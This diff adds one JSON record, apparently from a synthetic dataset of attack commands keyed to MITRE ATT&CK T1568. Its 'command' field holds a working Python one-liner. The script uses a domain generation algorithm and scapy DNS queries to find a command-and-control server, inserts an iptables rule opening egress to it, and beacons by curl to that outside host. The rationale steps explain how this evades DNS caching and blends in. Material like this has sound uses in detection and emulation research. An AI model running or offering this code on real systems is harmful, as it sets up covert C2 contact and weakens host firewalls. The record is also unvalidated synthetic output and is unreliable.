@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\n# Use system resolvers from /etc/resolv.conf and cache-bypass prefixes for dynamic resolution\nseed='resolv-key'\nimport re\nwith open('/etc/resolv.conf','r') as f:\n    resolvers=[m.group(1) for m in [re.match(r'^nameserver\\s+([0-9.]+)',l) for l in f] if m]\nif not resolvers:\n    resolvers=['8.8.8.8']\ntlds=['com','net','org']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:8]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ip=None; port=random.choice([5310,8448,19090])\nfor d in dga(30):\n    q='{}.{}'.format(''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6)), d)\n    for r in resolvers[:3]:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=q,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ip=a.rdata; dom=q; break\n        if ip: break\n    if ip: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/h'])\n    print(dom,ip,port)\"",
+  "explanation": "Leverages system-configured resolvers and randomized subdomain prefixes to bypass DNS caches while dynamically selecting a C2 endpoint.",
+  "rationale_steps": [
+    "Parse local resolvers from resolv.conf to blend with host DNS patterns.",
+    "Use DGA with random subdomain prefixes to avoid cached results.",
+    "Resolve with scapy across up to three resolvers until an A record appears.",
+    "Open an egress rule to a high port and beacon over HTTP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-f4199e75",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
